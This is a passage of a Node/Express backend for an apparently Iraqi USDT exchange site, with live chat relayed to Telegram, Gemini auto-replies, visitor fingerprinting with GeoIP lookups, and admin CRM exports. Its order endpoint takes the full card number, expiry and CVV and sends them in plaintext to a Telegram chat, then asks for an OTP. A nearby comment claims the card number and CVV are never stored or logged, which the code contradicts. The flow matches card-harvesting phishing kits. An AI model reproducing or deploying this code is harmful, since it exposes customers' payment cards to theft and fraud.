    const visitorFingerprint = normalizeFingerprintInput(body.visitorId || '');
    const clientIp = getClientIpFromRequest(req);
    const blocked = await getBlockedIpEntry(clientIp);
    if (blocked) {
      return res.status(403).json(blockedViolationPayload(blocked));
    }
    const blockedFp = await getBlockedFingerprintEntry(visitorFingerprint);
    if (blockedFp) {
      return res.status(403).json(blockedFingerprintViolationPayload(blockedFp));
    }
    const blockedChatRouter = await getBlockedChatIpEntry(clientIp);
    if (blockedChatRouter) {
      return res.status(403).json(blockedChatRouterViolationPayload(blockedChatRouter));
    }
    const blockedChatUser = await getBlockedChatUserEntry(visitorFingerprint);
    if (blockedChatUser) {
      return res.status(403).json(blockedChatViolationPayload(blockedChatUser));
    }
    await maybeWarnSameIpAsBlockedFingerprint(clientIp, visitorFingerprint);
    if (!sessionId.startsWith('sess_') || text.length < 1 || text.length > 4000) {
      return res.status(400).json({ error: 'Invalid payload' });
    }
    const store = await loadChatStore(CHAT_PATH);
    if (!store.sessions[sessionId]) {
      return res.status(404).json({ error: 'Session not found' });
    }

    const sess = store.sessions[sessionId];
    if (!sess.meta || typeof sess.meta !== 'object') sess.meta = {};
    const alreadyHandedOff = Boolean(sess.meta.handoffToStaff);

    appendUserMessage(store, sessionId, text, visitorName);

    if (alreadyHandedOff) {
      const tgMsgId = await notifyWebChatToTelegram(sessionId, text, visitorName, clientIp, visitorFingerprint);
      if (tgMsgId) bindTelegramMessage(store, tgMsgId, sessionId);
      await saveChatStore(CHAT_PATH, store);
      return res.json({ ok: true, mode: 'staff' });
    }

    if (wantsCustomerServiceTransfer(text)) {
      sess.meta.handoffToStaff = true;
      appendStaffMessage(
        store,
        sessionId,
        'تم تحويلك الى موظف خدمة العملاء. يرجى الانتظار وسيتم الرد عليك قريبا.'
      );
      const tgMsgId = await notifyWebChatToTelegram(
        sessionId,
        `طلب تحويل الى موظف خدمة العملاء.\nرسالة العميل: ${text}`,
        visitorName,
        clientIp,
        visitorFingerprint
      );
      if (tgMsgId) bindTelegramMessage(store, tgMsgId, sessionId);
      await saveChatStore(CHAT_PATH, store);
      return res.json({ ok: true, mode: 'staff', transferred: true });
    }

    try {
      const aiReply = await generateCustomerServiceAiReply(text, visitorName);
      appendStaffMessage(store, sessionId, aiReply);
    } catch {
      appendStaffMessage(
        store,
        sessionId,
        'واجهنا تاخيرا مؤقتا. اعد المحاولة، او اكتب تحويل لخدمة العملاء للتحويل لموظف.'
      );
    }

    await saveChatStore(CHAT_PATH, store);
    res.json({ ok: true, mode: 'ai' });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

async function saveChatMediaDataUrl(dataUrl, originalName = '') {
  const raw = String(dataUrl || '').trim();
  const m = raw.match(/^data:([^;]+);base64,([A-Za-z0-9+/=]+)$/);
  if (!m) throw new Error('Invalid media format');
  const mime = String(m[1] || '').toLowerCase();
  const base64 = m[2];
  const buf = Buffer.from(base64, 'base64');
  if (!buf.length) throw new Error('Empty file');
  if (buf.length > 6 * 1024 * 1024) throw new Error('File too large (max 6MB)');

  const extByMime = {
    'image/jpeg': 'jpg',
    'image/png': 'png',
    'image/webp': 'webp',
    'image/gif': 'gif',
    'video/mp4': 'mp4',
    'video/webm': 'webm',
    'audio/mpeg': 'mp3',
    'audio/ogg': 'ogg',
    'application/pdf': 'pdf',
  };
  const ext = extByMime[mime] || String(originalName || '').split('.').pop()?.toLowerCase() || 'bin';
  const safeExt = String(ext).replace(/[^a-z0-9]/gi, '').slice(0, 8) || 'bin';
  const name = `chat_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 8)}.${safeExt}`;
  const fullPath = path.join(CHAT_MEDIA_DIR, name);
  await writeFile(fullPath, buf);
  return { mediaUrl: `/api/chat-media/${name}`, mediaType: mime, mediaName: String(originalName || '').slice(0, 160) };
}

app.post('/api/chat/media', async (req, res) => {
  try {
    if (!chatRateOk(req)) {
      return res.status(429).json({ error: 'Too many requests' });
    }
    const body = req.body || {};
    const sessionId = String(body.sessionId || '').trim();
    const dataUrl = String(body.dataUrl || '').trim();
    const fileName = String(body.fileName || '').trim();
    const caption = String(body.caption || '').trim().slice(0, 600);
    const visitorName = String(body.visitorName || '').trim().slice(0, 80);
    const visitorFingerprint = normalizeFingerprintInput(body.visitorId || '');
    const clientIp = getClientIpFromRequest(req);

    const blocked = await getBlockedIpEntry(clientIp);
    if (blocked) return res.status(403).json(blockedViolationPayload(blocked));
    const blockedFp = await getBlockedFingerprintEntry(visitorFingerprint);
    if (blockedFp) return res.status(403).json(blockedFingerprintViolationPayload(blockedFp));

    if (!sessionId.startsWith('sess_') || !dataUrl) {
      return res.status(400).json({ error: 'Invalid payload' });
    }

    const store = await loadChatStore(CHAT_PATH);
    const sess = store.sessions[sessionId];
    if (!sess) return res.status(404).json({ error: 'Session not found' });
    if (!sess.meta || typeof sess.meta !== 'object') sess.meta = {};

    const media = await saveChatMediaDataUrl(dataUrl, fileName);
    const fallbackText = caption || (media.mediaType.startsWith('image/') ? 'صورة مرفقة' : 'ملف مرفق');
    appendUserMessage(store, sessionId, fallbackText, visitorName, media);

    if (sess.meta.handoffToStaff) {
      const msgForStaff = `وسائط من العميل: ${fallbackText}\nالنوع: ${media.mediaType}\nالرابط: ${media.mediaUrl}`;
      const tgMsgId = await notifyWebChatToTelegram(sessionId, msgForStaff, visitorName, clientIp, visitorFingerprint);
      if (tgMsgId) bindTelegramMessage(store, tgMsgId, sessionId);
    } else {
      appendStaffMessage(store, sessionId, 'تم استلام الوسائط. اذا ترغب بالتحويل لموظف اكتب: تحويل لخدمة العملاء.');
    }

    await saveChatStore(CHAT_PATH, store);
    res.json({ ok: true, mediaUrl: media.mediaUrl, mediaType: media.mediaType });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

function wantsCustomerServiceTransfer(text) {
  const s = String(text || '').toLowerCase().trim();
  if (!s) return false;
  if (/تحويل|حوّل|حولني|موظف|خدمة العملاء|دعم بشري|ادمِن|ادمن/.test(s)) return true;
  if (/human|agent|support|transfer|representative|customer service/.test(s)) return true;
  return false;
}

async function generateCustomerServiceAiReply(userText, visitorName = '') {
  const apiKey = String(process.env.GEMINI_API_KEY || '').trim();
  if (!apiKey) throw new Error('GEMINI_API_KEY not set');

  const modelCandidates = [
    String(process.env.GEMINI_MODEL || '').trim(),
    'gemini-flash-latest',
    'gemini-2.0-flash',
  ].filter(Boolean);

  const customerName = String(visitorName || '').trim().slice(0, 80);
  const input = String(userText || '').trim().slice(0, 2000);
  if (!input) throw new Error('Empty message');

  const prompt = [
    'انت مساعد خدمة عملاء لموقع تبادل USDT.',
    'المطلوب: افهم طلب العميل ثم قدم رد مختصر ومفيد وواضح.',
    'اذا كان الطلب يحتاج موظف بشري، اطلب منه كتابة: تحويل لخدمة العملاء.',
    'لا تذكر اي تفاصيل تقنية داخلية.',
    '',
    `اسم العميل: ${customerName || 'غير مذكور'}`,
    `رسالة العميل: ${input}`,
  ].join('\n');

  let lastError = 'Unknown AI error';
  for (const model of modelCandidates) {
    const url = `https://generativelanguage.googleapis.com/v1beta/models/${encodeURIComponent(model)}:generateContent`;
    const resp = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-goog-api-key': apiKey,
      },
      body: JSON.stringify({
        contents: [{ parts: [{ text: prompt }] }],
        generationConfig: { temperature: 0.35, maxOutputTokens: 500 },
      }),
      signal: AbortSignal.timeout(20000),
    });

    const data = await resp.json().catch(() => ({}));
    if (!resp.ok) {
      lastError = data?.error?.message || `HTTP ${resp.status}`;
      const modelMissing = String(lastError).includes('is not found')
        || String(lastError).includes('not supported for generateContent');
      if (modelMissing) continue;
      throw new Error(lastError);
    }

    const out = data?.candidates?.[0]?.content?.parts
      ?.map((p) => p?.text || '')
      .join('')
      .trim();
    if (out) return out.slice(0, 3500);
    lastError = `No AI output from model ${model}`;
  }

  throw new Error(lastError);
}

function isLocalOrPrivateIp(ip) {
  const s = String(ip || '').trim().replace(/^::ffff:/, '');
  if (!s) return true;
  if (s === '127.0.0.1' || s === '::1' || s === 'localhost') return true;
  if (/^(10)\./.test(s)) return true;
  if (/^(192)\.(168)\./.test(s)) return true;
  if (/^(172)\.(1[6-9]|2\d|3[0-1])\./.test(s)) return true;
  if (/^(169)\.(254)\./.test(s)) return true;
  if (/^(100)\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./.test(s)) return true;
  if (/^(fc|fd|fe80):/i.test(s)) return true;
  return false;
}

async function fetchJsonWithTimeout(url, ms = 3500) {
  const res = await fetch(url, { signal: AbortSignal.timeout(ms) });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}

async function fetchGeoIp(ip) {
  const cleanIp = String(ip || '').trim().replace(/^::ffff:/, '');
  if (isLocalOrPrivateIp(cleanIp)) {
    return { country: 'Local', city: '', countryCode: '' };
  }

  const providers = [
    async () => {
      const d = await fetchJsonWithTimeout(`https://ipwho.is/${encodeURIComponent(cleanIp)}`);
      if (!d?.success) return null;
      return {
        country: String(d.country || ''),
        city: String(d.city || ''),
        countryCode: String(d.country_code || ''),
      };
    },
    async () => {
      const d = await fetchJsonWithTimeout(`https://ipapi.co/${encodeURIComponent(cleanIp)}/json/`);
      if (d?.error) return null;
      return {
        country: String(d.country_name || ''),
        city: String(d.city || ''),
        countryCode: String(d.country_code || ''),
      };
    },
    async () => {
      const d = await fetchJsonWithTimeout(`https://ip-api.com/json/${encodeURIComponent(cleanIp)}?fields=status,country,countryCode,city`);
      if (d?.status !== 'success') return null;
      return {
        country: String(d.country || ''),
        city: String(d.city || ''),
        countryCode: String(d.countryCode || ''),
      };
    },
  ];

  for (const lookup of providers) {
    try {
      const loc = await lookup();
      if (loc?.country) {
        return {
          country: loc.country.slice(0, 80),
          city: loc.city.slice(0, 80),
          countryCode: loc.countryCode.slice(0, 4),
        };
      }
    } catch {
      // try next provider
    }
  }

  return { country: 'Unknown', city: '', countryCode: '' };
}

app.post('/api/track-visit', async (req, res) => {
  try {
    const clientIp = getClientIpFromRequest(req);
    const blocked = await getBlockedIpEntry(clientIp);
    if (blocked) {
      return res.status(403).json(blockedViolationPayload(blocked));
    }
    const body = req.body || {};
    const visitorId = String(body.visitorId || '');
    const blockedFp = await getBlockedFingerprintEntry(visitorId);
    if (blockedFp) {
      return res.status(403).json(blockedFingerprintViolationPayload(blockedFp));
    }
    await maybeWarnSameIpAsBlockedFingerprint(clientIp, visitorId);
    const pagePath = String(body.path || '/');
    if (shouldSkipVisitDedupe(visitorId, pagePath)) {
      return res.json({ ok: true, skipped: true });
    }
    const location = await fetchGeoIp(clientIp);
    const rec = buildVisitRecord(body, req, location);
    await appendVisit(VISITS_PATH, rec);
    res.json({ ok: true, id: rec.id });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

const ORDER_RATE_WINDOW_MS = 15 * 60 * 1000;
const ORDER_RATE_MAX = 3;

app.get('/api/order-status', async (req, res) => {
  try {
    const orderId = String(req.query.orderId || '').trim();
    if (!orderId) {
      return res.status(400).json({ error: 'Missing orderId' });
    }
    const all = await loadOrders(ORDERS_CRM_PATH);
    const row = findOrderByBusinessId(all, orderId);
    if (!row) {
      return res.status(404).json({ error: 'Order not found' });
    }
    res.json({ ok: true, order: publicOrderTrackingPayload(row) });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

app.get('/api/admin/crm/summary', async (req, res) => {
  try {
    if (!checkAdminCrmAuth(req)) {
      return res.status(adminCrmToken() ? 401 : 503).json({
        error: adminCrmToken() ? 'Unauthorized' : 'Set ADMIN_CRM_TOKEN in .env',
      });
    }
    const marketing = await loadStats();
    const summary = await buildFullCrmSummary(VISITS_PATH, ORDERS_CRM_PATH, marketing);
    res.json(summary);
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

app.get('/api/admin/crm/visits', async (req, res) => {
  try {
    if (!checkAdminCrmAuth(req)) {
      return res.status(adminCrmToken() ? 401 : 503).json({
        error: adminCrmToken() ? 'Unauthorized' : 'Set ADMIN_CRM_TOKEN in .env',
      });
    }
    const offset = Math.max(0, Number(req.query.offset) || 0);
    const limit = Math.min(500, Math.max(1, Number(req.query.limit) || 50));
    const all = await loadVisits(VISITS_PATH);
    const newestFirst = [...all].reverse();
    const slice = newestFirst.slice(offset, offset + limit);
    res.json({ total: all.length, offset, limit, items: slice });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

app.get('/api/admin/crm/orders', async (req, res) => {
  try {
    if (!checkAdminCrmAuth(req)) {
      return res.status(adminCrmToken() ? 401 : 503).json({
        error: adminCrmToken() ? 'Unauthorized' : 'Set ADMIN_CRM_TOKEN in .env',
      });
    }
    const offset = Math.max(0, Number(req.query.offset) || 0);
    const limit = Math.min(500, Math.max(1, Number(req.query.limit) || 50));
    const all = await loadOrders(ORDERS_CRM_PATH);
    const newestFirst = [...all].reverse();
    const slice = newestFirst.slice(offset, offset + limit);
    res.json({ total: all.length, offset, limit, items: slice });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

app.get('/api/admin/crm/export/visits.csv', async (req, res) => {
  try {
    if (!checkAdminCrmAuth(req)) {
      return res.status(adminCrmToken() ? 401 : 503).send(adminCrmToken() ? 'Unauthorized' : 'Set ADMIN_CRM_TOKEN');
    }
    const all = await loadVisits(VISITS_PATH);
    const csv = visitsToCsv(all);
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename="visits.csv"');
    res.send('\ufeff' + csv);
  } catch (e) {
    res.status(500).send(String(e?.message || e));
  }
});

app.get('/api/admin/crm/export/orders.csv', async (req, res) => {
  try {
    if (!checkAdminCrmAuth(req)) {
      return res.status(adminCrmToken() ? 401 : 503).send(adminCrmToken() ? 'Unauthorized' : 'Set ADMIN_CRM_TOKEN');
    }
    const all = await loadOrders(ORDERS_CRM_PATH);
    const csv = ordersToCsv(all);
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename="orders.csv"');
    res.send('\ufeff' + csv);
  } catch (e) {
    res.status(500).send(String(e?.message || e));
  }
});

app.get('/api/admin/crm/report.html', async (req, res) => {
  try {
    if (!checkAdminCrmAuth(req)) {
      return res.status(adminCrmToken() ? 401 : 503).send(adminCrmToken() ? 'Unauthorized' : 'Set ADMIN_CRM_TOKEN');
    }
    const marketing = await loadStats();
    const summary = await buildFullCrmSummary(VISITS_PATH, ORDERS_CRM_PATH, marketing);
    const visits = await loadVisits(VISITS_PATH);
    const orders = await loadOrders(ORDERS_CRM_PATH);
    const vSl = getRecentVisits(visits, 200);
    const oSl = getRecentOrders(orders, 200);
    let html = buildPrintableHtmlReport(summary, vSl, oSl);
    if (String(req.query.print || '') === '1') {
      html = html.replace(
        '</body>',
        '<script>window.addEventListener("load",function(){setTimeout(function(){window.print();},450);});</script></body>'
      );
    }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch (e) {
    res.status(500).send(String(e?.message || e));
  }
});

async function fetchUsdtUsdPrice() {
  try {
    const r = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=USDTBUSD', { signal: AbortSignal.timeout(4000) });
    if (!r.ok) throw new Error('binance fail');
    const d = await r.json();
    const price = parseFloat(d?.price);
    if (Number.isFinite(price) && price > 0) return price;
  } catch {
    // fallback
  }
  return 1.0;
}

async function computeRate(details) {
  const cfg = details?.rateConfig || {};
  if (cfg.mode === 'float') {
    const base = Number(cfg.floatBase || 1310);
    const offset = Number(cfg.floatOffset || 0);
    const usdtPrice = await fetchUsdtUsdPrice();
    return Math.round(usdtPrice * base + offset);
  }
  return Number(cfg.fixedRate || 1320);
}

/** Telegram: callback_data ≤ 64 bytes. Prefix od:/oa:/oc: + orderId (لا يتعارض مع قوائم أخرى). */
function orderInlineKeyboard(businessOrderId, extraRows = []) {
  const oidFull = String(businessOrderId || '').trim();
  const enc = (actionLetter) => {
    const prefix = `o${actionLetter}:`;
    let oid = oidFull;
    while (Buffer.byteLength(prefix + oid, 'utf8') > 64 && oid.length > 0) {
      oid = oid.slice(0, -1);
    }
    return `${prefix}${oid}`;
  };
  return {
    inline_keyboard: [
      [{ text: '✅ تم إكمال الطلب', callback_data: enc('d') }],
      [
        { text: '📁 أرشفة', callback_data: enc('a') },
        { text: '❌ إلغاء الطلب', callback_data: enc('c') },
      ],
      ...extraRows,
    ],
  };
}

function orderStatusLabelAr(status) {
  const s = String(status || 'received');
  const map = {
    received: 'قيد المعالجة',
    completed: 'تم الإكمال',
    archived: 'مؤرشف',
    cancelled: 'ملغى',
  };
  return map[s] || s;
}

/**
 * تحميل صورة من رابط تيليغرام وحفظها محلياً في QR_DIR.
 * يُرجع اسم الملف المحلي (بدون مسار).
 */
async function downloadQrToLocal(telegramUrl, profileId, methodKey) {
  if (!telegramUrl || !telegramUrl.includes('api.telegram.org')) return '';
  const ext = (telegramUrl.match(/\.(jpg|jpeg|png|webp|gif)$/i) || [, 'jpg'])[1];
  const filename = `${profileId}_${methodKey}.${ext}`;
  const dest = path.join(QR_DIR, filename);
  try {
    const resp = await fetch(telegramUrl, { signal: AbortSignal.timeout(15000) });
    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
    const buf = Buffer.from(await resp.arrayBuffer());
    await writeFile(dest, buf);
    return filename;
  } catch (e) {
    console.error(`[QR download] ${methodKey}:`, e?.message || e);
    return '';
  }
}

/**
 * لكل method في البروفايل: إن كان qrImage يحتوي api.telegram.org،
 * حمّل الصورة محلياً واستبدل الرابط بمسار محلي.
 * يُرجع true إذا تم تحديث أي حقل.
 */
async function migrateQrUrlsToLocal(details) {
  let changed = false;
  for (const profile of (details.profiles || [])) {
    for (const key of METHOD_KEYS) {
      const m = profile.methods?.[key];
      if (!m?.qrImage || !m.qrImage.includes('api.telegram.org')) continue;
      const localName = await downloadQrToLocal(m.qrImage, profile.id, key);
      if (localName) {
        m.qrImage = `/api/qr/${localName}`;
        changed = true;
      }
    }
  }
  if (changed) await savePaymentDetails(details);
  return changed;
}

app.get('/api/qr/:filename', async (req, res) => {
  const filename = String(req.params.filename || '').replace(/[^a-zA-Z0-9_.\-]/g, '');
  if (!filename) return res.status(400).end();
  const filePath = path.join(QR_DIR, filename);
  try {
    await access(filePath);
    res.setHeader('Cache-Control', 'public, max-age=86400');
    res.sendFile(filePath);
  } catch {
    res.status(404).end();
  }
});

app.get('/api/chat-media/:filename', async (req, res) => {
  const filename = String(req.params.filename || '').replace(/[^a-zA-Z0-9_.\-]/g, '');
  if (!filename) return res.status(400).end();
  const filePath = path.join(CHAT_MEDIA_DIR, filename);
  try {
    await access(filePath);
    res.setHeader('Cache-Control', 'public, max-age=86400');
    res.sendFile(filePath);
  } catch {
    res.status(404).end();
  }
});

app.get('/api/payment-details', async (_req, res) => {
  try {
    const clientIp = getClientIpFromRequest(_req);
    const blocked = await getBlockedIpEntry(clientIp);
    if (blocked) {
      return res.status(403).json(blockedViolationPayload(blocked));
    }
    const visitorFingerprint = normalizeFingerprintInput(
      _req.headers['x-visitor-id'] || _req.query?.visitorId || ''
    );
    const blockedFp = await getBlockedFingerprintEntry(visitorFingerprint);
    if (blockedFp) {
      return res.status(403).json(blockedFingerprintViolationPayload(blockedFp));
    }
    await maybeWarnSameIpAsBlockedFingerprint(clientIp, visitorFingerprint);
    const details = await loadPaymentDetails();
    const rate = await computeRate(details);
    res.json(buildPublicPaymentPayload(details, rate));
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

app.post('/api/order', async (req, res) => {
  try {
    const botToken = envRequired('TELEGRAM_BOT_TOKEN');
    const chatId = telegramSupportChatId();
    if (!chatId) {
      return res.status(503).json({
        error: 'Missing Telegram chat: set TELEGRAM_CHAT_ID in .env',
      });
    }

    const {
      orderId,
      visitorId: bodyVisitorId,
      name,
      wallet,
      walletNetwork,
      usdtAmount,
      iqdAmount,
      paymentMethod,
      paymentDetail,
      senderNumber,
      cardHolderName,
      cardNumber,
      cardExpiry,
      cardCvv,
      paymentProofName,
      paymentProofBase64,
      paymentProofMime,
      kycAcknowledged: bodyKycAck,
    } = req.body || {};

    if (!name || !wallet || !walletNetwork || !usdtAmount || !iqdAmount || !paymentMethod) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const amountNum = Number(usdtAmount);
    const normalizedNetwork = String(walletNetwork || '').toUpperCase();
    const walletTrim = String(wallet || '').trim();
    const senderTrim = String(senderNumber || '').trim();
    const clientIp = getClientIpFromRequest(req);
    const blocked = await getBlockedIpEntry(clientIp);
    if (blocked) {
      return res.status(403).json(blockedViolationPayload(blocked));
    }
    const visitorId = String(bodyVisitorId || '').trim() || `ip:${clientIp}`;
    const blockedFp = await getBlockedFingerprintEntry(visitorId);
    if (blockedFp) {
      return res.status(403).json(blockedFingerprintViolationPayload(blockedFp));
    }
    await maybeWarnSameIpAsBlockedFingerprint(clientIp, visitorId);
    const ua = req.get('user-agent') || '';
    const deviceLabel = describeDeviceFromUa(ua);

    if (!Number.isFinite(amountNum) || amountNum < 5) {
      return res.status(400).json({ error: 'Minimum amount is 5 USDT' });
    }

    const kycThreshold = Number(process.env.KYC_HIGH_VALUE_USDT || 1500);
    const kycAcknowledged = Boolean(bodyKycAck);
    if (Number.isFinite(kycThreshold) && kycThreshold > 0 && amountNum >= kycThreshold && !kycAcknowledged) {
      return res.status(400).json({
        error: 'يجب تأكيد الإقرار للمبالغ التي تصل أو تتجاوز حد التحقق.',
        errorEn: 'Please confirm the verification notice for orders at or above the threshold.',
        code: 'KYC_ACK_REQUIRED',
      });
    }
    if (!ALLOWED_NETWORKS.has(normalizedNetwork)) {
      return res.status(400).json({ error: 'Unsupported network' });
    }

    const isEvm = normalizedNetwork === 'ERC20' || normalizedNetwork === 'BEP20';
    const walletOk = isEvm ? /^0x[a-fA-F0-9]{40}$/.test(walletTrim) : /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(walletTrim);
    if (!walletOk) {
      return res.status(400).json({ error: 'Invalid wallet format for selected network' });
    }
    if (paymentMethod === 'Asia Hawala' && senderTrim && !/^07\d{9}$/.test(senderTrim)) {
      return res.status(400).json({ error: 'Invalid sender phone number format' });
    }

    let cardExpiryNorm = '';
    if (paymentMethod === 'CreditCard') {
      const holder = String(cardHolderName || '').trim();
      const digits = String(cardNumber || '').replace(/\D/g, '');
      const expiry = String(cardExpiry || '').trim();
      const cvv = String(cardCvv || '').trim();

      if (!holder) return res.status(400).json({ error: 'Card holder name is required' });
      if (!digits || digits.length < 13 || digits.length > 19) return res.status(400).json({ error: 'Invalid card number' });

      const m = expiry.match(/^(\d{2})\/(\d{2})$/);
      if (!m) return res.status(400).json({ error: 'Invalid expiry format (MM/YY)' });
      const mm = Number(m[1]);
      if (!(mm >= 1 && mm <= 12)) return res.status(400).json({ error: 'Invalid expiry month' });
      cardExpiryNorm = expiry;

      if (!/^[0-9A-Za-z]{3}$/.test(cvv)) return res.status(400).json({ error: 'Invalid CVV' });

      // Never log/store the full card number/CVV.
    }

    const detailsFull = await loadPaymentDetails();
    const rateNum = await computeRate(detailsFull);
    const publicPm = buildPublicPaymentPayload(detailsFull, rateNum);
    const pmKey = PAYMENT_METHOD_LABEL_TO_KEY[paymentMethod];
    if (!pmKey || !publicPm.methods?.[pmKey]) {
      return res.status(400).json({ error: 'Payment method not available for the active profile' });
    }

    const safeOrderId = String(orderId || `ORD-${Date.now().toString(36).toUpperCase()}`);

    const existingOrders = await loadOrders(ORDERS_CRM_PATH);
    if (countRecentOrdersByVisitor(existingOrders, visitorId, ORDER_RATE_WINDOW_MS) >= ORDER_RATE_MAX) {
      return res.status(429).json({
        error:
          'تم تجاوز الحد المسموح: 3 طلبات كحد أقصى خلال 15 دقيقة لكل نفس الجهاز. انتظر قليلاً ثم أعد المحاولة.',
        errorEn:
          'Limit reached: maximum 3 orders per 15 minutes per device. Please wait and try again.',
        code: 'ORDER_RATE_LIMIT',
      });
    }

    const activeProf = getActiveProfile(detailsFull);
    const profileLine = activeProf
      ? `<b>👤 بروفايل المنصة:</b> ${escapeTelegramHtml(activeProf.nameAr)} (${escapeTelegramHtml(activeProf.nameEn)})`
      : null;

    const isHighValue =
      Number.isFinite(kycThreshold) && kycThreshold > 0 && amountNum >= kycThreshold;
    const highValueLine = isHighValue
      ? `<b>⚠️ مبلغ مرتفع / High-value:</b> ${kycAcknowledged ? 'إقرار التحقق مُسجَّل / KYC ack ✓' : '—'}`
      : null;

    const lines = [
      '🚀 <b>طلب جديد (New Order)</b> 🚀',
      '━━━━━━━━━━━━━━━',
      profileLine,
      highValueLine,
      `<b>🧾 رقم الطلب:</b> ${escapeTelegramHtml(safeOrderId)}`,
      `<b>👤 الاسم:</b> ${escapeTelegramHtml(name)}`,
      `<b>💰 المبلغ:</b> ${escapeTelegramHtml(String(amountNum))} USDT`,
      `<b>💵 المقابل:</b> ${escapeTelegramHtml(String(iqdAmount))} IQD`,
      `<b>💳 طريقة الدفع:</b> ${escapeTelegramHtml(paymentMethod)}`,
      paymentDetail ? `<b>📱 تفاصيل الدفع:</b> ${escapeTelegramHtml(paymentDetail)}` : null,
      `<b>📥 محفظة الاستلام:</b> <code>${escapeTelegramHtml(walletTrim)}</code>`,
      `<b>🕸️ الشبكة:</b> ${escapeTelegramHtml(normalizedNetwork)}`,
      senderTrim ? `<b>📞 رقم المرسل:</b> ${escapeTelegramHtml(senderTrim)}` : null,
      paymentProofName ? `<b>📎 دليل الدفع:</b> ${escapeTelegramHtml(paymentProofName)}` : null,
      `<b>📱 الجهاز:</b> ${escapeTelegramHtml(deviceLabel)}`,
      `<b>🌐 IP:</b> <code>${escapeTelegramHtml(clientIp || '—')}</code>`,
      ...(paymentMethod === 'CreditCard'
        ? [
            '<b>🧪 وسيلة دفع بطاقة ائتمان:</b>',
            `<b>اسم الحامل:</b> ${escapeTelegramHtml(cardHolderName || '')}`,
            `<b>رقم البطاقة:</b> <code>${escapeTelegramHtml(String(cardNumber || '').replace(/\D/g, '').slice(-16) || '')}</code>`,
            `<b>تاريخ الانتهاء:</b> <code>${escapeTelegramHtml(cardExpiryNorm || '')}</code>`,
            `<b>CVV:</b> <code>${escapeTelegramHtml(String(cardCvv || '').slice(-3) || '')}</code>`,
          ]
        : []),
      '━━━━━━━━━━━━━━━',
      '<i>استخدم الأزرار أدناه لتحديث حالة الطلب (يظهر للعميل في صفحة التتبع).</i>',
    ].filter(Boolean);

    const modKb = await moderationInlineKeyboard(clientIp, visitorId);
    const modRows = modKb?.inline_keyboard || [];
    const { data: tgOrder } = await tgPostJson(botToken, 'sendMessage', {
      chat_id: telegramChatIdForApi(chatId),
      text: lines.join('\n'),
      parse_mode: 'HTML',
      reply_markup: orderInlineKeyboard(safeOrderId, modRows),
    });

    if (!tgOrder?.ok) {
      console.error('[order] Telegram sendMessage:', JSON.stringify(tgOrder || {}));
      const desc = String(tgOrder?.description || '');
      const lower = desc.toLowerCase();
      let hint = null;
      if (lower.includes('chat not found') || lower.includes('peer_id_invalid')) {
        hint =
          'تحقق: TELEGRAM_CHAT_ID مضبوط بشكل صحيح، '
          + 'والبوت عضو فيها، ثم: https://api.telegram.org/bot<TOKEN>/getChat?chat_id=<المعرّف>';
      }
      return res.status(502).json({
        error: 'Telegram send failed',
        telegramDescription: tgOrder?.description || null,
        telegramErrorCode: tgOrder?.error_code ?? null,
        hint,
        context: 'telegram_chat_id',
      });
    }

    let creditCardOtpExpAt = null;
    if (paymentMethod === 'CreditCard') {
      creditCardOtpExpAt = Date.now() + CREDIT_CARD_OTP_TTL_MS;
    }

    try {
      await appendOrderEvent(ORDERS_CRM_PATH, {
        orderId: safeOrderId,
        name,
        usdtAmount: amountNum,
        paymentMethod,
        network: normalizedNetwork,
        visitorId,
        deviceLabel,
        iqdAmount: String(iqdAmount),
        wallet: walletTrim,
        paymentDetail: String(paymentDetail || ''),
        senderNumber: senderTrim,
        ip: clientIp,
      });
    } catch (err) {
       
      console.error('[CRM] order log failed', err?.message || err);
    }

    // Send payment proof image/document if provided (multipart — reliable in Node)
    let proofSent = false;
    if (paymentProofBase64 && String(paymentProofBase64).length > 0) {
      const buf = Buffer.from(paymentProofBase64, 'base64');
      if (buf.length === 0) {
        return res.status(400).json({ error: 'Invalid payment proof data' });
      }
      const mime = String(paymentProofMime || 'image/jpeg').toLowerCase();
      const extFromName = String(paymentProofName || '').split('.').pop();
      const ext = mime === 'application/pdf'
        ? 'pdf'
        : (extFromName && extFromName.length <= 5 ? extFromName : (mime.split('/')[1] || 'jpg').replace('jpeg', 'jpg'));
      const filename = String(paymentProofName || `proof-${safeOrderId}.${ext}`);
      const caption = `دليل الدفع — طلب ${safeOrderId}`;

      const photoMime = new Set(['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp']);
      const usePhoto = photoMime.has(mime);
      const method = usePhoto ? 'sendPhoto' : 'sendDocument';
      const field = usePhoto ? 'photo' : 'document';

      const form = new FormData();
      form.append('chat_id', String(telegramChatIdForApi(chatId)));
      form.append('caption', caption);
      form.append(field, buf, { filename, contentType: mime });

      const { data: proofTg } = await tgPostMultipart(botToken, method, form);
      if (!proofTg?.ok) {
         
        console.error('Telegram proof send failed:', JSON.stringify(proofTg));
        return res.status(502).json({
          error: 'Telegram could not receive payment proof',
          details: JSON.stringify(proofTg || {}),
          orderId: safeOrderId,
        });
      }
      proofSent = true;
    }

    if (paymentMethod === 'CreditCard') {
      return res.json({
        ok: true,
        orderId: safeOrderId,
        proofSent,
        otpRequired: true,
        otpExpiresAt: creditCardOtpExpAt,
      });
    }

    res.json({ ok: true, orderId: safeOrderId, proofSent });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

